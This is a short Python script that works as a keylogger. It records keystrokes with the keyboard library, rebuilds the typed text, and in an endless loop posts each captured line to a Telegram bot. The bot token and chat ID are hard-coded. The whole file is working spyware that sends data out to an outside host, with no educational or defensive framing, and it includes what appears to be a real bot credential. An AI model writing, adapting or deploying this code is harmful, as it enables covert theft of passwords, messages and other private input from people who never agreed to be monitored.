import requests
import keyboard


API_TOKEN = '7744298681:AAEFAFsM0xJxhbeYO25tk1JbWY_dV_sUvB8'
CHAT_ID = '6739681362'
while True:
    def capture_text():
        events = keyboard.record(until='enter') 
        text = ""

        for event in events:
            if event.event_type == 'down': 
                key = event.name
                if key == 'space':
                    text += ' '
                elif key == 'backspace':
                    text = text[:-1]
                elif key == 'enter':
                    break
                elif len(key) == 1:
                    text += key

        return text




    msg=capture_text()

    response = requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage",data={"chat_id": CHAT_ID,"text": msg})

    print(response.text)
    print("Message sent to Telegram!" if response.ok else "Failed to send the message.")